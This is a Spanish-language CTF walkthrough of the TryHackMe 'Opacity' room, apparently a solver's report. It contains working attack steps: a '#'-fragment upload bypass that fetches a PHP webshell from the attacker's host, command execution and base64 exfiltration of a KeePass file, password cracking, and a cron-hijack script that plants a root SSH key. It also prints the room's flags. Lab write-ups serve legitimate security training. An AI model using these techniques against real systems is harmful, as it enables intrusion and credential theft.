# Opacity — TryHackMe Walkthrough

**Room:** [Opacity](https://tryhackme.com/room/opacity)  
**Difficulty:** Easy  
**Date:** 2026-07-06  
**Target IP:** `10.66.172.242`  
**Attack IP:** `192.168.134.200`

---

## 1. Reconocimiento

```
PORT    STATE  SERVICE     VERSION
22/tcp  open   ssh         OpenSSH 8.2p1 Ubuntu
80/tcp  open   http        Apache httpd 2.4.41
139/tcp open   netbios-ssn Samba smbd 4.6.2
445/tcp open   netbios-ssn Samba smbd 4.6.2
```

SMB sin shares accesibles anónimamente (solo `print$` e `IPC$`).

---

## 2. Enumeración Web

- **`/`** → login.php (sin credenciales)
- **`/cloud/`** → Image uploader por URL (sin autenticación)
- Los archivos se guardan en `/cloud/images/` y se borran cada ~5 minutos

El upload recibe una URL, descarga el archivo si termina en extensión de imagen (`.jpg`, `.png`, etc.) y lo aloja temporalmente.

---

## 3. Bypass del filtro + RCE

El servidor sanitiza el nombre del archivo pero el `#` (fragmento de URL) actúa como comentario en shell, haciendo que el nombre se trunque antes del `#`.

**Payload:**
```bash
curl -s http://10.66.172.242/cloud/index.php \
  -d "url=http://192.168.134.200:8081/shell.php#.jpg"
```

Esto guarda el archivo como `shell.php` (no `.jpg`), permitiendo ejecución PHP.

```php
# exploits/shell.php
<?php system($_GET["c"]); ?>
```

**Verificación:**
```
curl -s "http://10.66.172.242/cloud/images/shell.php?c=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 4. KeePass Database

En `/opt/` hay un archivo KeePass `dataset.kdbx` propiedad de `sysadmin`.

**Exfiltración:**
```
curl -s "http://10.66.172.242/cloud/images/shell.php?c=base64+/opt/dataset.kdbx"
```

**Cracking:**
```bash
keepass2john dataset.kdbx > hash.txt
john --wordlist=rockyou.txt hash.txt
# Password: 741852963
```

**Contenido:**
| Campo | Valor |
|-------|-------|
| Title | user:password |
| UserName | sysadmin |
| Password | `Cl0udP4ss40p4city#8700` |

---

## 5. User Flag

```bash
sshpass -p 'Cl0udP4ss40p4city#8700' ssh sysadmin@10.66.172.242
```

```
User flag: 6661b61b44d234d230d06bf5b3c075e2
```

---

## 6. Privilege Escalation → Root

En `/home/sysadmin/scripts/` hay un `script.php` ejecutado por **root** vía cron cada ~5 minutos.

```php
// script.php (propiedad de root, no modificable)
require_once('lib/backup.inc.php');
zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
echo 'Successful', PHP_EOL;
// ... cleanup de /var/www/html/cloud/images
```

El directorio `scripts/` está dentro del home de sysadmin, así que podemos **moverlo** y crear uno nuevo:

```bash
mv /home/sysadmin/scripts /home/sysadmin/scripts2
mkdir -p /home/sysadmin/scripts
```

**Nuevo `script.php` malicioso:**
```php
<?php
mkdir('/root/.ssh', 0700, true);
file_put_contents('/root/.ssh/authorized_keys',
  "ssh-rsa AAAAB3N...", FILE_APPEND);
?>
```

Al ejecutarse el cron como root, agrega nuestra clave SSH.

```bash
ssh -i root_key root@10.66.172.242
```

---

## 7. Root Flag

```
Root flag: ac0d56f93202dd57dcb2498c739fd20e
```

---

## Resumen de Flags

| Flag | Valor |
|------|-------|
| **User (local.txt)** | `6661b61b44d234d230d06bf5b3c075e2` |
| **Root (proof.txt)** | `ac0d56f93202dd57dcb2498c739fd20e` |

---

## Archivos generados

| Archivo | Descripción |
|---------|-------------|
| `exploits/shell.php` | Webshell (`<?php system($_GET["c"]); ?>`) |
| `exploits/rshell.php` | Reverse shell PHP |
| `exploits/dataset.kdbx` | KeePass database extraída |
| `nmap/initial.txt` | Escaneo de puertos |
| `report.md` | Este reporte |
